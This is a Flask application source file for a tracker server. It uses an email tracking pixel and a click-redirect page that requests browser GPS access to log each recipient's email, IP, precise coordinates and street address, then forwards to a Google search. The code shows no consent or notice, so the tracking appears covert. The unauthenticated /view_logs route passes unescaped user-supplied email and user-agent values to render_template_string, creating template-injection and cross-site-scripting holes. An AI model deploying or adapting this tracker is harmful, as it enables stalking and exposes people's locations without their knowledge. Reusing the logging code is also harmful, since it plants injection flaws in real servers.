# app.py

from flask import Flask, request, redirect, render_template_string, render_template, Response
from ip_locator import get_location_from_ip 
from opencage.geocoder import OpenCageGeocode 
from base64 import b64decode # For the tracking pixel
import datetime
import sqlite3 
import os 

app = Flask(__name__)

# --- Configuration ---
FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
DATABASE_FILE = 'click_tracker.db'

# Load API Key from Render Environment Variable
OPENCAGE_API_KEY = os.environ.get("OPENCAGE_API_KEY", "MISSING")

# Initialize the OpenCage client
if OPENCAGE_API_KEY != "MISSING":
    geocoder = OpenCageGeocode(OPENCAGE_API_KEY)
else:
    geocoder = None


# --- Database Setup and Logging Functions ---
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            source TEXT, 
            email TEXT,      
            user_agent TEXT
        )
    """)
    conn.commit()
    conn.close()

def log_click_data(ip, location, user_agent, source="IP", email=None): 
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = (timestamp, ip, location.get('country', 'N/A'), location.get('city', 'N/A'), 
            location.get('latitude'), location.get('longitude'), source, email, user_agent)

    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO clicks (timestamp, ip_address, country, city, latitude, longitude, source, email, user_agent) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, data)
        conn.commit()
        conn.close()
        print(f"--- LOGGED ({source}) --- Email: {email} | Loc: {location.get('city', 'N/A')}")
        
    except sqlite3.Error as e:
        print(f"SQLite error during logging: {e}")

# --- Geocoding Function ---
def get_address_from_coords(lat, lon):
    if not geocoder:
        return "API Key Missing (Check Render Environment Variables)"
    try:
        results = geocoder.reverse_geocode(lat, lon, limit=1)
        if results and results[0]['formatted']:
            return results[0]['formatted']
        else:
            return "Address Not Found via OpenCage"
    except Exception as e:
        print(f"OpenCage API Error: {e}")
        return "Geocoding API Error"


# --- OPEN TRACKING ROUTE (The Pixel) ---
@app.route('/track_open')
def track_open():
    user_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown')
    email = request.args.get('email', 'anonymous@example.com') 
    
    # 1. Perform IP Geolocation 
    location_data = get_location_from_ip(user_ip)
    
    if location_data and location_data.get('latitude'):
        lat, lon = location_data['latitude'], location_data['longitude']
        full_address = get_address_from_coords(lat, lon)
        location_data['city'] = full_address
        location_data['country'] = "IP_GEO_OPEN"
    else:
        location_data = {"country": "Unknown", "city": "Email Not Tracked", "latitude": None, "longitude": None}

    # 2. Log the data
    log_click_data(user_ip, location_data, user_agent, source="OPEN_PIXEL", email=email)
    
    # 3. Return a 1x1 transparent PNG pixel (Base64 encoded)
    pixel_data = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
    
    return Response(response=b64decode(pixel_data), status=200, mimetype='image/png')


# 0. HOME PAGE (Server Stability Check)
@app.route('/')
def home():
    return "<h1>Tracker Server is Running!</h1><p>Use the /track_click route to start tracking.</p>"


# --- CLICK TRACKING ROUTES ---

@app.route('/track_click')
def track_click():
    user_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown')
    email = request.args.get('email', 'anonymous@example.com') 
    
    # Pass all data to the GPS request page
    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}&email={email}")

@app.route('/request_location')
def request_location():
    return render_template('request_location.html', 
                           user_ip=request.args.get('ip'), 
                           user_agent=request.args.get('ua'),
                           email=request.args.get('email'))

@app.route('/location_received')
def location_received():
    ip, ua, email = request.args.get('ip'), request.args.get('ua'), request.args.get('email')
    lat, lon = request.args.get('lat'), request.args.get('lon')
    
    full_address = get_address_from_coords(float(lat), float(lon))
    
    location_data = {"country": "GPS_DATA", "city": full_address, "latitude": float(lat), "longitude": float(lon)}
    log_click_data(ip, location_data, ua, source="GPS", email=email)
    
    return redirect(FINAL_DESTINATION_URL)

@app.route('/fallback')
def fallback():
    ip, ua, email = request.args.get('ip'), request.args.get('ua'), request.args.get('email')
    
    location_data = get_location_from_ip(ip)
    
    if location_data and location_data.get('latitude') and location_data.get('longitude'):
        lat, lon = location_data['latitude'], location_data['longitude']
        full_address = get_address_from_coords(lat, lon)
        location_data['city'] = full_address
        location_data['country'] = "IP_GEO_LOC"
    elif not location_data:
        location_data = {"country": "Unknown", "city": "Unknown", "latitude": None, "longitude": None}

    log_click_data(ip, location_data, ua, source="IP_FALLBACK", email=email)
    
    return redirect(FINAL_DESTINATION_URL)

@app.route('/view_logs')
def view_logs():
    if not os.path.exists(DATABASE_FILE):
        return render_template_string("<h1>Logs</h1><p>Database file not found.</p>")

    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT id, timestamp, ip_address, country, city, latitude, longitude, source, email, user_agent FROM clicks ORDER BY timestamp DESC")
    logs = cursor.fetchall()
    conn.close()

    html = "<h1>Click Tracking Logs</h1><table border='1' style='width: 100%; word-wrap: break-word; table-layout: fixed;'><tr><th>ID</th><th>Time</th><th>IP</th><th>Country</th><th>City (Address)</th><th>Lat</th><th>Lon</th><th>Source</th><th>**Email**</th><th>User Agent</th></tr>"
    for row in logs:
        ua_display = row[9][:50] + '...' if len(row[9]) > 50 else row[9] 
        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td><td>{row[7]}</td><td>{row[8]}</td><td>{ua_display}</td></tr>"
    html += "</table>"
    return render_template_string(html)


if __name__ == '__main__':
    init_db() 
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    print("--- Flask GPS/IP Geolocation Tracker Running ---")
    app.run(debug=True, host='127.0.0.1', port=5000)